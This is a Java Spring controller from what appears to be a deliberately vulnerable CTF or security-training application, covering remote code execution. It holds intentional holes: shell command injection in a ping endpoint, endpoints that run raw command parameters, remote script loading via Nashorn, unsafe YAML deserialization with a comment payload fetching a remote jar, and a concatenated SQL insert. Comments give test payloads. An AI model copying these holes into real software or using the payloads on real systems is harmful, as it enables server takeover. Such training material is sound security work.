package com.sducsrp.csrp.controller.BUGcontroller;


import com.sducsrp.csrp.common.Constants;
import com.sducsrp.csrp.common.Result;
import com.sducsrp.csrp.entity.FlagMake;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.*;
import java.sql.*;

//import groovy.lang.GroovyShell;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.sql.DataSource;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;

@RestController
@RequestMapping("/RCE/")//接口注解
public class RCEController {

    @Autowired
    DataSource dataSource;
    public String sql;

    //RCE-ping漏洞（测试payload：127.0.0.1 | whoami 或者 127.0.0.1 && whoami）
    //127.0.0.1 ; ls
    @RequestMapping("ping")
    public Result RCE_ping(@RequestParam(value = "ip",required = false) String ip,
                           @RequestParam("username") String username) throws IOException {

        //for flag
        //String username = "moxi";
        String problemid = "pro001";
        String flag = null;
        String flagBase64 = null;
        //真正的flag
        String flagPath1 = "/test/rce/flag.txt";
//        String flagPath1 = "D://test/rce/flag.txt";
        //String flagMD5 = null;

        try {
            Connection connection = dataSource.getConnection();
            // 预编译
            String sql = "select flag from flag where username = ? and problemid = ?";
            PreparedStatement st = connection.prepareStatement(sql, ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);
            st.setString(1, username);
            st.setString(2, problemid);
            System.out.println(sql);
            ResultSet rs = st.executeQuery();
            // 通过此对象可以得到表的结构，包括，列名，列的个数，列数据类型
            rs.last();
            int row = rs.getRow();

            rs.beforeFirst();
            System.out.println("查找到行数为"+row);
            if(row==1){
                rs.next();
                flag = rs.getString("flag");
                System.out.println("flag已存在:"+ flag);
            }
            else {
                FlagMake flagMake = new FlagMake();
                flag = flagMake.getFlag();
                System.out.println("生成flag:"+ flag);
                //将flag存入数据库
                //flagMD5 = MD5.getMD5String(flag);
                sql = "insert into flag (`username`, `problemid`, `flag`) values ('"+username+
                        "', '"+problemid+"', '"+flag+"');";
                System.out.println(sql);
                //PreparedStatement st1 = connection.prepareStatement(sql,ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);
                Statement stmt = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
                        ResultSet.CONCUR_UPDATABLE);

                stmt.executeUpdate(sql);

                // st1.executeUpdate();
            }

            rs.close();
            connection.close();


        } catch (SQLException e) {
            System.out.println("输入内容错误，数据库查询错误");
            System.out.println(e.toString());
            //return "输入内容错误，数据库查询错误";
        }

        //将flag base64编码后写入文件
        flagBase64 = setEncryptionBase64(flag);
        System.out.println("将flagBase64写入文件："+flagBase64);
        saveAsFileWriter(flagBase64,flagPath1);

        //for rce
        String result="";
//        String ls = " cd /home/ && dir ";
        Process process = null;
        String[] cmd ={"/bin/sh",
                "-c",
                //"ping -c 5 127.0.0.1 ; ls"};
                "ping -c 5 "+ip};
        try {
            process = Runtime.getRuntime().exec(cmd);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line = null;

            while ((line = bufferedReader.readLine()) != null) {
                //		System.out.println(new String(line.getBytes(),"GBK"));
                result=result+new String(line.getBytes(),"GBK");
            }
            System.out.println(result);

        }catch (Exception e){
            e.printStackTrace();
        }
        finally {
            process.destroy();
        }
//        Runtime runtime = Runtime.getRuntime();
//        //StringBuffer b=new StringBuffer();
//        String result = null;
//        String pingStr = "ls "+ip;
//        BufferedReader br = null;


        Result res=new Result(Constants.CODE_200,null,result);
        return res;
    }

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            Process p = run.exec(cmd);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        //        } catch (Exception e) {
//            e.printStackTrace();
//        } finally {
//            if (br != null) {
//                try {
//                    br.close();
//                } catch (Exception e) {
//                    e.printStackTrace();
//                }
//            }
//        }
        return sb.toString();
    }


    /**
     * http://localhost:8080/rce/ProcessBuilder?cmd=whoami
     * @param cmd cmd
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();
//        try {
//            Process p = Runtime.getRuntime().exec(pingStr);
//            br = new BufferedReader(new InputStreamReader(p.getInputStream()));
//            String line = null;
//            StringBuilder sb=new StringBuilder();
//            while ((line = br.readLine()) != null) {
//                sb.append(line+"\n");
//            }
//            System.out.println(sb.toString());
//            result = sb.toString();
        try {
            String[] arrCmd = {"/bin/sh", "-c", cmd};
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml();
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
//    @GetMapping("groovy")
//    public void groovyshell(String content) {
//        GroovyShell groovyShell = new GroovyShell();
//        groovyShell.evaluate(content);
//    }
    /**
     * 写数据到txt文件
     * @param filePath 写入文件的路径
     * @param content 写入文件的数据
     */
    public static void saveAsFileWriter(String content,String filePath)
            throws IOException{
        FileWriter fwriter = null;
        try {
            // true表示不覆盖原来的内容，而是加到文件的后面。若要覆盖原来的内容，直接省略这个参数就好
            fwriter = new FileWriter(filePath);
            fwriter.write(content);
        } catch (IOException ex) {
            ex.printStackTrace();
        } finally {
            try {
                fwriter.flush();
                fwriter.close();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    //编码
    public static String setEncryptionBase64(String str){
        byte[] b = null;
        String s = null;

        try {
            b = str.getBytes("utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        if( b != null){
            s = new BASE64Encoder().encode(b);
        }
        return s;

    }

    //解码
    public static String getDecodeBase64(String str){
        byte[] b = null;
        String result = null;

        if(str != null){
            BASE64Decoder decoder = new BASE64Decoder();
            try {
                b = decoder.decodeBuffer(str);
                result = new String(b, "utf-8");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return result;
    }



}
